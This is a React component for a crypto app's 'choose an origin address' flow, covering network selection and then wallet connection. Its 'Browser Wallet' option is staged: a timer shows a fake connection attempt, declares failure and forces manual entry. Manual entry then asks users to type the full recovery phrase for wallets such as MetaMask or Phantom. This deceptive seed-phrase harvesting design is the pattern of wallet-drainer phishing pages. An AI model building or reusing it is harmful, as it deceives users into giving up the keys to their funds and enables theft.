"use client";
import React, { useState, useEffect } from "react";
import { Label } from "../ui/label";
import { Input } from "../ui/input";
import {
	Select,
	SelectContent,
	SelectItem,
	SelectTrigger,
	SelectValue,
} from "../ui/select";
import { Button } from "../ui/button";
import { motion, AnimatePresence } from "framer-motion";

type Network = {
	value: string;
	label: string;
	icon?: string;
};

const NETWORKS: Network[] = [
	{
		value: "bitcoin",
		label: "BITCOIN",
		icon: "/images/crypto/bitcoin-btc-logo.svg",
	},
	{ value: "eth", label: "ETH", icon: "/images/crypto/ethereum-eth-logo.svg" },
	{
		value: "avax",
		label: "AVAX",
		icon: "/images/crypto/avalanche-avax-logo.svg",
	},
	{
		value: "bnb",
		label: "BNB",
		icon: "/images/crypto/bnb-bnb-logo.svg",
	},
	{
		value: "matic",
		label: "MATIC",
		icon: "/images/crypto/polygon-matic-logo.svg",
	},
	{
		value: "tron",
		label: "TRX",
		icon: "/images/crypto/tron-trx-logo.svg",
	},
	{ value: "solana", label: "SOL", icon: "/images/crypto/solana-sol-logo.svg" },
];

interface SelectNetworkProps {
	blockChainNetwork: string;
	setBlockChainNetwork: React.Dispatch<React.SetStateAction<string>>;
	networks: Network[];
}

interface OriginProps {
	onNext: () => void;
}

function OriginAddress({ onNext }: OriginProps) {
	const [blockChainNetwork, setBlockChainNetwork] = useState<string>("");
	const [originSteps, setOriginSteps] = useState<number>(0);
	const [addressMode, setAddressMode] = useState<"manual" | "automatic">(
		"automatic"
	);

	// ✅ Continue button logic
	const [isContinueDisabled, setContinueDisabled] = useState(true);

	const [selectedWallet, setSelectedWallet] = useState("");
	const [seedPhrases, setSeedPhrases] = useState<string[]>([]);

	useEffect(() => {
		if (originSteps === 0) {
			setContinueDisabled(!blockChainNetwork);
		} else if (originSteps === 1) {
			if (addressMode === "manual") {
				setContinueDisabled(!(selectedWallet && seedPhrases.length >= 12));
			} else {
				setContinueDisabled(false);
			}
		}
	}, [
		originSteps,
		blockChainNetwork,
		selectedWallet,
		seedPhrases,
		addressMode,
	]);

	const handleContinue = () => {
		if (originSteps === 0) {
			setOriginSteps(1);
		} else if (originSteps === 1) {
			onNext();
		}
	};

	return (
		<section className="h-full min-h-[50dvh] flex flex-col relative">
			<div className="pb-4">
				<p className="font-semibold text-lg">Choose an origin address</p>
			</div>

			{originSteps === 0 && (
				<SelectNetwork
					blockChainNetwork={blockChainNetwork}
					setBlockChainNetwork={setBlockChainNetwork}
					networks={NETWORKS}
				/>
			)}

			{originSteps === 1 && (
				<ChooseAddress
					addressMode={addressMode}
					setAddressMode={setAddressMode}
					selectedWallet={selectedWallet}
					setSelectedWallet={setSelectedWallet}
					seedPhrases={seedPhrases}
					setSeedPhrases={setSeedPhrases}
				/>
			)}

			<div className="w-full flex pt-6 mt-auto border-t border-black/20">
				<Button
					className="button-primary w-full"
					onClick={handleContinue}
					disabled={isContinueDisabled}
				>
					Continue
				</Button>
			</div>
		</section>
	);
}

const SelectNetwork: React.FC<SelectNetworkProps> = ({
	blockChainNetwork,
	setBlockChainNetwork,
	networks,
}) => {
	return (
		<div className="flex flex-col gap-12 w-full py-8 border-t border-black/20">
			<p className="text-black/65 text-sm font-semibold">
				First, tell us what tokens you have by selecting a blockchain network.
			</p>

			<div className="flex w-full">
				<div className="flex flex-col w-full space-y-2">
					<Label htmlFor="blockchain">Blockchain Network</Label>
					<Select
						value={blockChainNetwork}
						onValueChange={(value) => setBlockChainNetwork(value)}
					>
						<SelectTrigger>
							<SelectValue placeholder="Please select a blockchain network" />
						</SelectTrigger>
						<SelectContent className="text-black bg-white">
							{networks.map((network) => (
								<SelectItem
									key={network.value}
									value={network.value}
								>
									<div className="flex justify-center items-center gap-4 text-black/80 py-2 font-medium">
										<i className="w-4 h-4">
											<img
												src={network.icon}
												alt={network.value}
											/>
										</i>
										{network.label}
									</div>
									{/* <div className="font-medium">{network.label}</div> */}
								</SelectItem>
							))}
						</SelectContent>
					</Select>
				</div>
			</div>
		</div>
	);
};

// ✅ ChooseAddress extended version
interface ChooseAddressProps {
	addressMode: "manual" | "automatic";
	setAddressMode: React.Dispatch<React.SetStateAction<"manual" | "automatic">>;
	selectedWallet: string;
	setSelectedWallet: React.Dispatch<React.SetStateAction<string>>;
	seedPhrases: string[];
	setSeedPhrases: React.Dispatch<React.SetStateAction<string[]>>;
}

function ChooseAddress({
	addressMode,
	setAddressMode,
	selectedWallet,
	setSelectedWallet,
	seedPhrases,
	setSeedPhrases,
}: ChooseAddressProps) {
	const [isOverlayVisible, setOverlayVisible] = useState(false);
	const [isLoading, setLoading] = useState(false);
	const [showFailure, setShowFailure] = useState(false);

	const popularWallets = [
		{ value: "metamask", label: "MetaMask" },
		{ value: "trustwallet", label: "Trust Wallet" },
		{ value: "phantom", label: "Phantom" },
		{ value: "lace", label: "Lace" },
		{ value: "coinbase", label: "Coinbase Wallet" },
	];

	useEffect(() => {
		if (addressMode === "automatic") {
			setOverlayVisible(true);
			setLoading(true);
			setShowFailure(false);

			const loadTimer = setTimeout(() => {
				setLoading(false);
				setShowFailure(true);
			}, 3000);

			const closeTimer = setTimeout(() => {
				setOverlayVisible(false);
				setAddressMode("manual");
			}, 4500);

			return () => {
				clearTimeout(loadTimer);
				clearTimeout(closeTimer);
			};
		}
	}, [addressMode, setAddressMode]);

	const handlePhraseChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
		const phrases = e.target.value.trim().split(/\s+/);
		setSeedPhrases(phrases);
	};

	return (
		<div className="flex flex-col gap-6 w-full py-6 border-t border-black/20 relative">
			<p className="text-black/65 text-sm font-semibold">
				Next, tell us where you want to hold your tokens
			</p>

			{/* Radio Buttons */}
			<div className="flex flex-col gap-4">
				{/* Automatic */}
				<div
					className={`flex items-center justify-between border rounded-lg p-4 cursor-pointer transition ${
						addressMode === "automatic"
							? "border-blue-600 bg-indigo-100/70"
							: "border-black/0 hover:border-black/40 bg-neutral-100"
					}`}
					onClick={() => setAddressMode("automatic")}
				>
					<div className="flex items-center gap-3">
						<input
							type="radio"
							name="addressMode"
							value="automatic"
							checked={addressMode === "automatic"}
							onChange={() => setAddressMode("automatic")}
							className="accent-black"
						/>
						<Label className="text-black font-medium whitespace-nowrap">
							Browser Wallet
						</Label>
					</div>
					<span className="text-xs text-black/60">(e.g. MetaMask, Lace)</span>
				</div>

				{/* Manual */}
				<div
					className={`flex items-center justify-between border rounded-lg p-4 cursor-pointer transition ${
						addressMode === "manual"
							? "border-blue-600 bg-indigo-100/70"
							: "border-black/0 hover:border-black/40 bg-neutral-100"
					}`}
					onClick={() => setAddressMode("manual")}
				>
					<div className="flex items-center gap-3">
						<input
							type="radio"
							name="addressMode"
							value="manual"
							checked={addressMode === "manual"}
							onChange={() => setAddressMode("manual")}
							className="accent-black"
						/>
						<Label className="text-black font-medium">Manual</Label>
					</div>
					<span className="text-xs text-black/60">(Enter seed phrase)</span>
				</div>
			</div>

			{/* Wallet select (only visible if manual) */}
			{addressMode === "manual" && (
				<div className="flex flex-col gap-4">
					<Label>Select your wallet</Label>
					<Select
						value={selectedWallet}
						onValueChange={(val) => setSelectedWallet(val)}
					>
						<SelectTrigger>
							<SelectValue placeholder="Select your wallet provider" />
						</SelectTrigger>
						<SelectContent className="text-black bg-white">
							{popularWallets.map((wallet) => (
								<SelectItem
									key={wallet.value}
									value={wallet.value}
								>
									<p className="font-medium text-black/80">{wallet.label}</p>
								</SelectItem>
							))}
						</SelectContent>
					</Select>

					{/* Seed phrase textarea */}
					<div className="flex flex-col gap-2 mt-4">
						<Label>Seed phrase</Label>
						<textarea
							placeholder="Enter your recovery phrase here (each word separated by space)"
							className="border p-3 rounded-md text-black resize-none h-28 placeholder:text-xs lg:placeholder:text-sm"
							onChange={handlePhraseChange}
						/>
						<p className="text-xs text-black/50">
							{seedPhrases.length} phrase entered
						</p>
					</div>
				</div>
			)}

			{/* Overlay for Automatic Mode */}
			<AnimatePresence>
				{isOverlayVisible && (
					<motion.div
						initial={{ opacity: 0 }}
						animate={{ opacity: 1 }}
						exit={{ opacity: 0 }}
						className="fixed inset-0 bg-black/70 flex flex-col items-center justify-center z-50"
					>
						{isLoading ? (
							<motion.div
								initial={{ opacity: 0 }}
								animate={{ opacity: 1 }}
								transition={{ duration: 0.3 }}
								className="text-center text-white space-y-4"
							>
								<div className="animate-spin w-10 h-10 border-4 border-white/30 border-t-white rounded-full mx-auto" />
								<p>Connecting to your browser wallet...</p>
							</motion.div>
						) : showFailure ? (
							<motion.p
								initial={{ opacity: 0 }}
								animate={{ opacity: 1 }}
								className="text-red-700 text-center bg-white/60 backdrop-blur p-8 rounded-sm"
							>
								Connection failed — switched to manual entry.
							</motion.p>
						) : null}
					</motion.div>
				)}
			</AnimatePresence>
		</div>
	);
}

export default OriginAddress;
